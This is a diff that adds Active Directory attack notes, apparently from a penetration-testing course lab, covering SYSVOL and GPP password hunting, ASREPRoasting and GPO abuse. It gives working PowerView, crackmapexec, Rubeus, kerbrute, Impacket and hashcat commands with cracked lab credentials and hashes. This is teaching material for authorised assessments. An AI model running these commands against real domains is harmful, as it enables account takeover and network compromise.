@@ -51,6 +51,11 @@
     - [Sniffing LDAP Credentials](#sniffing-ldap-credentials)
     - [Enumerating DNS Records](#enumerating-dns-records)
     - [Password in Description Field](#password-in-description-field)
+    - [PASSWD\_NOTREQD Field](#passwd_notreqd-field)
+    - [Credentials in SMB Shares and SYSVOL Scripts](#credentials-in-smb-shares-and-sysvol-scripts)
+    - [Group Policy Preference (_GPP_) Passwords](#group-policy-preference-gpp-passwords)
+    - [ASREPRoasting](#asreproasting)
+    - [Group Policy Object (_GPO_) Abuse](#group-policy-object-gpo-abuse)
 
 ---
 
@@ -1566,3 +1571,363 @@ guest          Built-in account for guest access to the computer/domain
 krbtgt         Key Distribution Center Service Account
 ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
 ```
+
+### PASSWD_NOTREQD Field
+
+It is possible to come across domain accounts with the passwd_notreqd field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all. A password may be set as blank intentionally or accidentally hitting enter before entering a password when changing it via the command line. Just because this flag is set on an account, it doesn't mean that no password is set, just that one may not be required. There are many reasons why this flag may be set on a user account, one being that a vendor product set this flag on certain accounts at the time of installation and never removed the flag post-install. It is wort enumerating accounts with this flag set and testing each to see if no password is required. Also, include it in the client report if the goal of the assessment is to be as comprehensive as possible.
+
+```powershell
+PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+
+samaccountname                                                         useraccountcontrol
+--------------                                                         ------------------
+guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
+nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT
+```
+
+### Credentials in SMB Shares and SYSVOL Scripts
+
+The SYSVOL share can be a treasure trove of data, especially in large organizations. You may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. It is worth digging around this directory to hunt for passwords stored in scripts. Sometimes you will find very old scripts containing since disabled accounts or old passwords, but from time to time, you will strike gold, so you should always dig through this directory. Here, you can see an interesting script named ```reset_local_admin_pass.vbs```.
+
+```powershell
+PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
+
+    Directory: \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
+
+
+Mode                LastWriteTime         Length Name                                                                 
+----                -------------         ------ ----                                                                 
+-a----       11/18/2021  10:44 AM            174 daily-runs.zip                                                       
+-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1                                                    
+-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm                                                     
+-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs  
+```
+
+Taking a closer look at the script, you see that it contains a password for the built-in local administrator on Windows hosts. In this case, it would be worth checking to see if this password is still set on any hosts in the domain. You could do this using CME and the ```--local-auth``` flag.
+
+```powershell
+PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
+
+On Error Resume Next
+strComputer = "."
+ 
+Set oShell = CreateObject("WScript.Shell") 
+sUser = "Administrator"
+sPwd = "!ILFREIGHT_L0cALADmin!"
+ 
+Set Arg = WScript.Arguments
+If  Arg.Count > 0 Then
+sPwd = Arg(0) 'Pass the password as parameter to the script
+End if
+ 
+'Get the administrator name
+Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+
+<SNIP>
+```
+
+### Group Policy Preference (_GPP_) Passwords
+
+When a new group is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:
+
+- Map drives
+- Create local users
+- Create printer config files
+- Creating and updating services
+- Creating scheduled tasks
+- Changing local admin passwords
+
+These files can contain an array of configuration data and defined passwords. The ```cpassword``` attribute value is AES-256 bit encrypted, but Microsoft published the [AES private key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this DC share.
+
+This was patched in 2014 MS14-025 "Vulnerability in GPP could allow elevation of privilege", to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.
+
+The XML looks like the following:
+
+![ad extras 7](../../../../images/ad_extras7.png)
+
+If you retrieve the cpassword value more manually, the ```gpp-decrypt``` utility can be used to decrypt the password as follows:
+
+```bash
+d41y@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
+
+Password1
+```
+
+GPP passwords can be located by searching or manually browsing the SYSVOL share or using tools such as [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1), the GPP Metasploit Post Module, and other Python/Ruby scripts which will locate the GPP and return the decrypted cpassword value. CME also has two modules for locating and retrieving GPP passwords. One quick tip to consider during engagements: Often, GPP passwords are defined for legacy accounts, and you may therefore retrieve and decrypt the password for a locked or deleted account. However, it is worth attempting to password spray internally with this password. Password re-use is widespread, and the GPP password combined with password spraying could result in further access.
+
+```bash
+d41y@htb[/htb]$ crackmapexec smb -L | grep gpp
+
+[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
+[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
+```
+
+It is also possible to find passwords in files such as Registry.xml when autologon is configured via Group Policy. This may be set up for any number of reasons for a machine to automatically log in at boot. If this is set via Group Policy and not locally on the host, then anyone on the domain can retrieve credentials stored in the Registry.xml file created for this purpose. This is a separate issue from GPP passwords as Microsoft has not taken any action to block storing these credentials on the SYSVOL in cleartext and, hence, are readable by any authenticated user in the domain. You can hunt for this using CME with the gpp_autologin module, or using the Get-GPPAutologon.ps1 script included in PowerSploit.
+
+```bash
+d41y@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
+```
+
+In the output above, you can see that you have retrieved the credentials for an account called guarddesk. This may have been set up so that shared workstations used by guards automatically log in at boot to accommodate multiple users throughout the day and night working different shifts. In this case, the credentials are likely a local admin, so it would be worth finding hosts where you can log in as admin and hunt for additional data. Sometimes you may discover credentials for a highly privileged user or credentials for a disabled account/an expired password that is no use to you.
+
+### ASREPRoasting
+
+It's possible to obtain the TGT for any account that has the "Do not require Kerberos pre-authentication" setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (_AS\_REP_) is encrypted with the account's password, and any domain user can request it.
+
+With pre-authentication, a user enters their password, which encrypts a time stamp. The DC will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the DC. This can be subjected to an offline password attack using a tool such as Hashcat or John.
+
+![ad extras 8](../../../../images/ad_extras8.png)
+
+ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.
+
+The attack itself can be performed with the Rubeus toolkit and other tools to obtain the ticket for the target account. If an attacker has GenericWrite or GenericAll permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.
+
+Below is an example of the attack. PowerView can be used to enumerate users with their UAC value set to ```DONT_REQ_PREAUTH```.
+
+```powershell
+PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+
+samaccountname     : mmorgan
+userprincipalname  : mmorgan@inlanefreight.local
+useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
+```
+
+With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth.
+
+```powershell
+PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: AS-REP roasting
+
+[*] Target User            : mmorgan
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))'
+[*] SamAccountName         : mmorgan
+[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
+[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\mmorgan'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+     $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55$0978822DEC13046712DB7DC03F6C4DE059A946485451AAE98BB93DFF8E3E64F3AA5614160F21A029C2B9437CB16E5E9DA4A2870FEC0596B09BADA989D1F8057262EA40840E8D0F20313B4E9A40FA5E4F987FF404313227A7BFFAE748E07201369D48ABB4727DFE1A9F09D50D7EE3AA5C13E4433E0F9217533EE0E74B02EB8907E13A208340728F794ED5103CB3E5C7915BF2F449AFDA41988FF48A356BF2BE680A25931A8746A99AD3E757BFE097B852F72CEAE1B74720C011CFF7EC94CBB6456982F14DA17213B3B27DFA1AD4C7B5C7120DB0D70763549E5144F1F5EE2AC71DDFC4DCA9D25D39737DC83B6BC60E0A0054FC0FD2B2B48B25C6CA
+```
+
+You can then crack the hash offline using Hashcat with mode 18200.
+
+```bash
+d41y@htb[/htb]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
+
+hashcat (v6.1.1) starting...
+
+<SNIP>
+
+$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f4e0537e0188a6897a478c55$0978822dec13046712db7dc03f6c4de059a946485451aae98bb93dff8e3e64f3aa5614160f21a029c2b9437cb16e5e9da4a2870fec0596b09bada989d1f8057262ea40840e8d0f20313b4e9a40fa5e4f987ff404313227a7bffae748e07201369d48abb4727dfe1a9f09d50d7ee3aa5c13e4433e0f9217533ee0e74b02eb8907e13a208340728f794ed5103cb3e5c7915bf2f449afda41988ff48a356bf2be680a25931a8746a99ad3e757bfe097b852f72ceae1b74720c011cff7ec94cbb6456982f14da17213b3b27dfa1ad4c7b5c7120db0d70763549e5144f1f5ee2ac71ddfc4dca9d25d39737dc83b6bc60e0a0054fc0fd2b2b48b25c6ca:Welcome!00
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, AS-REP
+Hash.Target......: $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f...25c6ca
+Time.Started.....: Fri Apr  1 13:18:40 2022 (14 secs)
+Time.Estimated...: Fri Apr  1 13:18:54 2022 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   782.4 kH/s (4.95ms) @ Accel:32 Loops:1 Thr:64 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 10506240/14344385 (73.24%)
+Rejected.........: 0/10506240 (0.00%)
+Restore.Point....: 10493952/14344385 (73.16%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: WellHelloNow -> W14233LTKM
+
+Started: Fri Apr  1 13:18:37 2022
+Stopped: Fri Apr  1 13:18:55 2022
+```
+
+When performing user enumeration with Kerbrute, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-auth.
+
+```bash
+d41y@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop
+
+2022/04/01 13:14:17 >  Using KDC(s):
+2022/04/01 13:14:17 >  	172.16.5.5:88
+
+2022/04/01 13:14:17 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
+2022/04/01 13:14:17 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local
+2022/04/01 13:14:17 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3d429aad39ec68a33$8698ee566cde591a7ddd1782db6f7ed8531e266befed4856b9fcbbdda83a0c9c5ae4217b9a43d322ef35a6a22ab4cbc86e55a1fa122a9f5cb22596084d6198454f1df2662cb00f513d8dc3b8e462b51e8431435b92c87d200da7065157a6b24ec5bc0090e7cf778ae036c6781cc7b94492e031a9c076067afc434aa98e831e6b3bff26f52498279a833b04170b7a4e7583a71299965c48a918e5d72b5c4e9b2ccb9cf7d793ef322047127f01fd32bf6e3bb5053ce9a4bf82c53716b1cee8f2855ed69c3b92098b255cc1c5cad5cd1a09303d83e60e3a03abee0a1bb5152192f3134de1c0b73246b00f8ef06c792626fd2be6ca7af52ac4453e6a
+
+<SNIP>
+```
+
+With a valid list of users, you can use Get-NPUsers.py from the Impacket toolkit to hunt for all users with Kerberos pre-auth not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found. You can also feed a wordlist into the tool, it will throw errors for users that do not exist, but if it finds any valid ones without Kerberos pre-auth, then it can be a nice way to obtain a foothold or further your access, depending on where you are in the course of your assessment. Even if you are unable to crack the AS-REP using Hashcat it is still good to report this as a finding to clients so thex can assess whether or not the account requires this setting.
+
+```bash
+d41y@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+[-] User sbrown@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User jjones@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User tjohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User jwilson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User bdavis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User njohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User asanchez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User dlewis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User ccruz@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8345dd9247a0e3d$b62d45bc3c0f4c306402a205ebdbbc623d77ad016e657337630c70f651451400329545fb634c9d329ed024ef145bdc2afd4af498b2f0092766effe6ae12b3c3beac28e6ded0b542e85d3fe52467945d98a722cb52e2b37325a53829ecf127d10ee98f8a583d7912e6ae3c702b946b65153bac16c97b7f8f2d4c2811b7feba92d8bd99cdeacc8114289573ef225f7c2913647db68aafc43a1c98aa032c123b2c9db06d49229c9de94b4b476733a5f3dc5cc1bd7a9a34c18948edf8c9c124c52a36b71d2b1ed40e081abbfee564da3a0ebc734781fdae75d3882f3d1d68afdb2ccb135028d70d1aa3c0883165b3321e7a1c5c8d7c215f12da8bba9
+[-] User rramirez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User jwallace@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User jsantiago@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+<SNIP>
+```
+
+### Group Policy Object (_GPO_) Abuse
+
+Group policy provides administrators with many advanced settings that can be applied to both user and computer objects in an AD environment. Group policy, when used right, is an excellent tool for hardening an AD environment by configuring user settings, OS, and applications. Group policy can also be abused by attackers. If you can gain rights over a Group Policy Object via an ACL misconfig, you could leverage this for lateral movement, privesc, domain compromise, and even as a persistence mechanism within the domain. Understanding how to enumerate and attack GPOs can give you a leg up and can sometimes be the ticket to achieving your goal in a rather locked-down environment.
+
+GPO misconfigs can be abused to perform the following attacks:
+
+- Adding additional rights to a user
+- Adding a local admin user to one or more hosts
+- Creating an immediate scheduled task to perform a number of actions
+
+You can enumerate GPO information using many tools such as PowerView and BloodHound. You can also use [groupr3](https://github.com/Group3r/Group3r), [ADRecon](https://github.com/sense-of-security/ADRecon), [PingCastel](https://www.pingcastle.com/), among others, to audit the security of GPOs in a domain.
+
+Using the Get-DomainGPO function from PowerView, you can get a listing of GPOs by name.
+
+```powershell
+PS C:\htb> Get-DomainGPO |select displayname
+
+displayname
+-----------
+Default Domain Policy
+Default Domain Controllers Policy
+Deny Control Panel Access
+Disallow LM Hash
+Deny CMD Access
+Disable Forced Restarts
+Block Removable Media
+Disable Guest Account
+Service Accounts Password Policy
+Logon Banner
+Disconnect Idle RDP
+Disable NetBIOS
+AutoLogon
+GuardAutoLogon
+Certificate Services
+```
+
+This can be helpful for you to begin to see what types of security measures are in place. You can see that autologon is in use which may mean there is a readable password in a GPO, and see that AD CS is present in the domain. If Group Policy Management Tools are installed on the host you are working from, you can use various built-in GroupPolicy cmdlets such as Get-GPO to perform the same enumeration.
+
+```powershell
+PS C:\htb> Get-GPO -All | Select DisplayName
+
+DisplayName
+-----------
+Certificate Services
+Default Domain Policy
+Disable NetBIOS
+Disable Guest Account
+AutoLogon
+Default Domain Controllers Policy
+Disconnect Idle RDP
+Disallow LM Hash
+Deny CMD Access
+Block Removable Media
+GuardAutoLogon
+Service Accounts Password Policy
+Logon Banner
+Disable Forced Restarts
+Deny Control Panel Access
+```
+
+Next, you can check if a user you can control has any rights over a GPO. Specific users or groups may be granted rights to administer one or more GPOs. A good first check is to see if the entire Domain Users group has any rights over one or more GPOs.
+
+```powershell
+PS C:\htb> $sid=Convert-NameToSid "Domain Users"
+PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
+
+ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
+ObjectSID             :
+ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,
+                        WriteOwner
+BinaryLength          : 36
+AceQualifier          : AccessAllowed
+IsCallback            : False
+OpaqueLength          : 0
+AccessMask            : 983095
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
+AceType               : AccessAllowed
+AceFlags              : ObjectInherit, ContainerInherit
+IsInherited           : False
+InheritanceFlags      : ContainerInherit, ObjectInherit
+PropagationFlags      : None
+AuditFlags            : None
+```
+
+Here you can see that the Domain Users group has various permissions over a GPO, such as WriteProperty and WriteDacl, which you could change to give yourself full control over the GPO and pull of any number of attacks that would be pushed down to any users and computers in OUs that the GPO is applied to. You can use the GPO GUID combined with Get-GPO to see the display name of the GPO.
+
+```powershell
+PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
+
+DisplayName      : Disconnect Idle RDP
+DomainName       : INLANEFREIGHT.LOCAL
+Owner            : INLANEFREIGHT\Domain Admins
+Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
+GpoStatus        : AllSettingsEnabled
+Description      :
+CreationTime     : 10/28/2021 3:34:07 PM
+ModificationTime : 4/5/2022 6:54:25 PM
+UserVersion      : AD Version: 0, SysVol Version: 0
+ComputerVersion  : AD Version: 0, SysVol Version: 0
+WmiFilter        :
+```
+
+Checking in BloodHound, you can see that the Domain Users group has several rights over the "Disconnect Idle RDP" GPO, which could be leveraged for full control of the object.
+
+![ad extras 9](../../../../images/ad_extras9.png)
+
+
+If you select the GPO in BloodHound and scroll down to "Affected Objects" on the "Node Info" tab, you can see that this GPO is applied to one OU, which contains four computer objects.
+
+![ad extras 10](../../../../images/ad_extras10.png)
+
+You could use a tool such as [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to take advantage of this GPO misconfig by performing actions such as adding a user that you control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give you a reverse shell, or configure a malicious computer startup script to provide you with a reverse shell or similar. When using a tool like this, you need to be careful because commands can be run that affect every computer within the OU that the GPO is linked to. If you found an editable GPO that applies to an OU with 1,000 computers, you would not want to make the mistake of adding yourself as a local admin to that many hosts. Some of the attack options available with this tool allow you to specify a target user or host. The hosts shown in the above image are not exploitable.
